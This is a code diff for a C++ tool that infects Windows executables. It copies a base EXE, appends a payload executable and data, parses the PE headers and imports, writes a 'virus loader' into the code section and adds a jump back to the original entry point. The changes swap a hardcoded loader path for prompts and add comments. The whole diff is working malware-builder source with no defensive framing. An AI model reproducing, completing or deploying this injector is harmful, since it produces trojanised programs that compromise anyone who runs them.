@@ -15,7 +15,6 @@ typedef long long addr_t;
 #define RELATIVE_CALL_INSTRUCTION 0xE8
 #define SIZEOF_REL32_JUMP 5
 #define SIZEOF_REL32_CALL 5
-#define VIRUS_LOADER_PATH "../debug/virusloader"
 #define EMPTY_SECTION_MARGIN 0
 
 // map filled with needed extern functions
@@ -59,7 +58,7 @@ std::vector<std::pair<std::string, std::string>> externFunctionsToFill = {
 };
 
 void analyzeEXE(const char* exePath);
-std::string addPayload(const std::string& base, const std::string& payload);
+std::string addPayload(const std::string& base, const std::string& payload, const std::string& additional);
 
 int main()
 {
@@ -67,29 +66,42 @@ int main()
     std::cout << "Base exe path: ";
     std::getline(std::cin, basePath);
 
-    std::string payloadPath;
-    std::cout << "Payload exe path: ";
-    std::getline(std::cin, payloadPath);
+    std::string executablePath;
+    std::cout << "File to execute path: ";
+    std::getline(std::cin, executablePath);
 
-    std::string newPath = addPayload(basePath, payloadPath);
+    std::string payloadData;
+    std::cout << "Payload data path: ";
+    std::getline(std::cin, payloadData);
+
+    std::string newPath = addPayload(basePath, executablePath, payloadData);
     analyzeEXE(newPath.c_str());
 }
 
-std::string addPayload(const std::string& base, const std::string& payload)
+// function appends new executable and data to the end of the base executable
+// input: paths of base exe, payload exe and payload data
+// return: path of new executable
+std::string addPayload(const std::string& base, const std::string& executable, const std::string& additional)
 {
     std::string newPath = "COPY - " + base;
     CopyFileA(base.c_str(), newPath.c_str(), FALSE);
 
     // add payload to copy
     HANDLE houtfile = CreateFileA(newPath.c_str(), FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    HANDLE hinfile = CreateFileA(payload.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hinfile = CreateFileA(executable.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
     // get file size
     dllToFuncNameToAddress["VARIABLES"]["BaseFileSize"] = GetFileSize(houtfile, NULL);
 
-    // write payload
+    // write executable
     BYTE buff[1024];
     DWORD bytesRead = 0;
+    while (ReadFile(hinfile, buff, sizeof(buff), &bytesRead, NULL) && bytesRead > 0)
+        WriteFile(houtfile, buff, bytesRead, NULL, NULL);
+
+    CloseHandle(hinfile);
+    // write additional payload
+    hinfile = CreateFileA(additional.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     while (ReadFile(hinfile, buff, sizeof(buff), &bytesRead, NULL) && bytesRead > 0)
         WriteFile(houtfile, buff, bytesRead, NULL, NULL);
 
@@ -100,9 +112,16 @@ std::string addPayload(const std::string& base, const std::string& payload)
 }
 
 addr_t base;
-void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, addr_t codeSectionRawToVirtual)
+// function writes the virus loader inside the new executable
+// input: exe file ptr, offset between code section file position to virtual address
+// return: none
+void writeVirusLoader(FILE* exeFile, addr_t codeSectionRawToVirtual)
 {
-    FILE* virusLoader = fopen(virusLoaderPath, "r");
+    std::string virusLoaderPath;
+    std::cout << "Enter virus loader binary path: ";
+    std::getline(std::cin, virusLoaderPath);
+
+    FILE* virusLoader = fopen(virusLoaderPath.c_str(), "r");
     if (!virusLoader)
     {
         printf("Can't open virus loader file\n");
@@ -144,6 +163,9 @@ void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, addr_t codeSec
     fclose(virusLoader);
 }
 
+// function reads string from file into a buffer
+// input: file ptr to read from, file position and buffer to store buffer
+// return: none
 void freadstr(FILE* file, char* buffer, long pos)
 {
     long startPos = ftell(file);
@@ -160,6 +182,9 @@ void freadstr(FILE* file, char* buffer, long pos)
     fseek(file, startPos, SEEK_SET);
 }
 
+// function fills addresses for requires extern call using the import directory
+// input: exe file ptr, position of import directory in file, offset between virtual address to file raw position in code section, image base address
+// return: none
 void getExternCallAddresses(FILE* file, int importDirectoryPos, addr_t virtualRawOffset, addr_t imageBase)
 {
     char nameBuffer[1000] = { 0 };
@@ -202,6 +227,9 @@ void getExternCallAddresses(FILE* file, int importDirectoryPos, addr_t virtualRa
     }
 }
 
+// function analyzes exe file and inserts the virus in it.
+// input: path of exe file
+// return: none
 void analyzeEXE(const char* exePath)
 {
     IMAGE_DOS_HEADER dosHeader;
@@ -279,7 +307,7 @@ void analyzeEXE(const char* exePath)
     // inject virus loading code
     fseek(file, overwriteRaw, SEEK_SET);
 
-    writeVirusLoader(file, VIRUS_LOADER_PATH, codeSectionRawToVirtual);
+    writeVirusLoader(file, codeSectionRawToVirtual);
 
     // write jump to original entry point
     fputc(RELATIVE_JUMP_INSTRUCTION, file);
